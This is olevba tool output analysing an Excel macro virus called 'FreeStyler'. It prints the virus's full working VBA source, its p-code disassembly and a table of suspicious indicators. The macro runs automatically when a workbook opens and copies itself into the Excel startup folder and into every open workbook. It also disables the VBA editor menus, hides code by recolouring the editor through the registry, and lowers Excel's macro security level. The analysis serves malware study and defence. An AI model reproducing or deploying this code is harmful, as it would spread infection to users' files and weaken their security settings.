olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Free
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Free - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Workbook_Activate()
On Error Resume Next
'VOVAN//SMF
With Application: .EnableCancelKey = 0: .DisplayAlerts = 0: .ScreenUpdating = 0: .CommandBars("Visual Basic").Visible = False: .CommandBars("Macro").Enabled = False: .CommandBars("Window").Controls(3).Enabled = False: .CommandBars("Window").Controls(4).Enabled = False: .CommandBars("Tools").Controls(13).Enabled = False: End With
For vl = 1 To Application.CommandBars("Visual Basic").Controls.Count
Application.CommandBars("Visual Basic").Controls(vl).Enabled = False
Next
For mo = 1 To Application.CommandBars("Macro").Controls.Count
Application.CommandBars("Macro").Controls(mo).Enabled = False
Next
If ThisWorkbook.FullName Like "*:*" = True Then Save_D = True Else Save_D = False
If ThisWorkbook.Saved = True Then Save_T = True Else Save_T = False
If ThisWorkbook.Path = Application.StartupPath Then Application.OnTime Now + TimeValue("00:01:" & Second(Now())), CodeName & ".Workbook_Activate"
If UCase(Dir(Application.StartupPath + "\FreeStyler.")) <> UCase("FREESTYLER") Then
VV = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
Workbooks.Add
With ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString VV: End With
ActiveWorkbook.SaveAs FileName:=Application.StartupPath & "\FreeStyler."
ActiveWindow.Visible = False
Workbooks("FREESTYLER.").SaveAs FileName:=Application.StartupPath & "\FreeStyler."
Workbooks("FREESTYLER.").Close
End If
For N = 1 To Workbooks.Count
VV = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For Each TW In Workbooks.Item(N).VBProject.VBComponents
If TW.CodeModule.Find("FreeStyler", 1, 1, 75, 75) Then FreeStyler = True
Next TW
If FreeStyler = False Then
If Workbooks.Item(N).Saved = False Then Save_ = False Else Save_ = True
Workbook_New
With Workbooks.Item(N).VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString VV: End With
If Save_ = True Then
If Workbooks.Item(N).FullName Like "*:*" = True Then
System.Cursor = wdCursorNormal
Workbooks.Item(N).SaveAs FileName:=Workbooks.Item(N).FullName
Else
Workbooks.Item(N).Saved = True
End If
End If
End If
FreeStyler = False
Next N
If ThisWorkbook.Path = Application.StartupPath Then Workbook_New
If Save_D = False And Save_T = True Then ThisWorkbook.Saved = True
If Save_D = True And Save_T = True Then ThisWorkbook.Save
Set WshShell = CreateObject("WScript.Shell")
For z = 1 To 2
If z = 1 Then nf = "Office" Else nf = "6.0\Common"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\" & nf & "\CodeBackColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\" & nf & "\CodeForeColors", "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\VBA\" & nf & "\EndProcLine", 0, "REG_DWORD"
Next
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security\Level", 1, "REG_DWORD"
End Sub
Private Sub Workbook_Open()
Workbook_Activate
End Sub
Private Sub Workbook_New()
On Error Resume Next
If ActiveWorkbook.ReadOnly = True Then Exit Sub
C = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
B = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
iii = Mid(C, 13)
ffl = Len(iii) - 2
khh = Left(iii, ffl)
Number = ThisWorkbook.VBProject.VBComponents(1).CodeModule.ProcCountLines(khh, vbext_pk_Proc)
VV = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Number)
With ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, Number
.InsertLines B, VV
End With








End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Free - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Free - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Free - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Free
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 12159 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Workbook_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	QuoteRem 0x0000 0x000A "VOVAN//SMF"
' Line #4:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith DisplayAlerts 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith ScreenUpdating 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitStr 0x0006 "Window"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0006 "Window"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	LitDI2 0x000D 
' 	LitStr 0x0005 "Tools"
' 	ArgsMemLdWith CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	EndWith 
' Line #5:
' 	StartForVariable 
' 	Ld vl 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Visual Basic"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld vl 
' 	LitStr 0x000C "Visual Basic"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	StartForVariable 
' 	Next 
' Line #8:
' 	StartForVariable 
' 	Ld mo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Macro"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld mo 
' 	LitStr 0x0005 "Macro"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	StartForVariable 
' 	Next 
' Line #11:
' 	Ld ThisWorkbook 
' 	MemLd FullName 
' 	LitStr 0x0003 "*:*"
' 	Like 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Save_D 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Save_D 
' 	EndIf 
' Line #12:
' 	Ld ThisWorkbook 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Save_T 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Save_T 
' 	EndIf 
' Line #13:
' 	Ld ThisWorkbook 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0006 "00:01:"
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	Concat 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld CodeName 
' 	LitStr 0x0012 ".Workbook_Activate"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #14:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\FreeStyler."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "FREESTYLER"
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' Line #16:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #17:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #18:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld VV 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' Line #19:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\FreeStyler."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #21:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000C "\FreeStyler."
' 	Concat 
' 	ParamNamed FileName 
' 	LitStr 0x000B "FREESTYLER."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #22:
' 	LitStr 0x000B "FREESTYLER."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld N 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #25:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' Line #26:
' 	StartForVariable 
' 	Ld TW 
' 	EndForVariable 
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #27:
' 	LitStr 0x000A "FreeStyler"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	LitDI2 0x004B 
' 	Ld TW 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FreeStyler 
' 	EndIf 
' Line #28:
' 	StartForVariable 
' 	Ld TW 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld FreeStyler 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Save_ 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Save_ 
' 	EndIf 
' Line #31:
' 	ArgsCall Workbook_New 0x0000 
' Line #32:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #33:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld VV 
' 	ArgsMemCallWith AddFromString 0x0001 
' 	BoS 0x0000 
' 	EndWith 
' Line #34:
' 	Ld Save_ 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0003 "*:*"
' 	Like 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld wdCursorNormal 
' 	Ld System 
' 	MemSt Cursor 
' Line #37:
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	LitVarSpecial (True)
' 	Ld N 
' 	Ld Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Saved 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitVarSpecial (False)
' 	St FreeStyler 
' Line #44:
' 	StartForVariable 
' 	Ld N 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	Ld ThisWorkbook 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Workbook_New 0x0000 
' 	EndIf 
' Line #46:
' 	Ld Save_D 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Save_T 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld ThisWorkbook 
' 	MemSt Saved 
' 	EndIf 
' Line #47:
' 	Ld Save_D 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld Save_T 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ThisWorkbook 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #48:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set WshShell 
' Line #49:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #50:
' 	Ld z 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0006 "Office"
' 	St nf 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x000A "6.0\Common"
' 	St nf 
' 	EndIf 
' Line #51:
' 	LitStr 0x0029 "HKEY_CURRENT_USER\Software\Microsoft\VBA\"
' 	Ld nf 
' 	Concat 
' 	LitStr 0x000F "\CodeBackColors"
' 	Concat 
' 	LitStr 0x001F "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #52:
' 	LitStr 0x0029 "HKEY_CURRENT_USER\Software\Microsoft\VBA\"
' 	Ld nf 
' 	Concat 
' 	LitStr 0x000F "\CodeForeColors"
' 	Concat 
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0002 
' Line #53:
' 	LitStr 0x0029 "HKEY_CURRENT_USER\Software\Microsoft\VBA\"
' 	Ld nf 
' 	Concat 
' 	LitStr 0x000C "\EndProcLine"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0003 
' Line #54:
' 	StartForVariable 
' 	Next 
' Line #55:
' 	LitStr 0x004E "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6"
' 	LitDI2 0x0000 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0003 
' Line #56:
' 	LitStr 0x0044 "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security\Level"
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld WshShell 
' 	ArgsMemCall RegWrite 0x0003 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #59:
' 	ArgsCall Workbook_Activate 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Private Sub Workbook_New())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	Ld ActiveWorkbook 
' 	MemLd ReadOnly 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #64:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St C 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St B 
' Line #66:
' 	Ld C 
' 	LitDI2 0x000D 
' 	ArgsLd Mid$ 0x0002 
' 	St iii 
' Line #67:
' 	Ld iii 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	St ffl 
' Line #68:
' 	Ld iii 
' 	Ld ffl 
' 	ArgsLd LBound 0x0002 
' 	St khh 
' Line #69:
' 	Ld khh 
' 	Ld vbext_pk_Proc 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Number 
' Line #70:
' 	LitDI2 0x0001 
' 	Ld Number 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VV 
' Line #71:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #72:
' 	LitDI2 0x0001 
' 	Ld Number 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #73:
' 	Ld B 
' 	Ld VV 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #74:
' 	EndWith 
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Лист1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист3 - 956 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

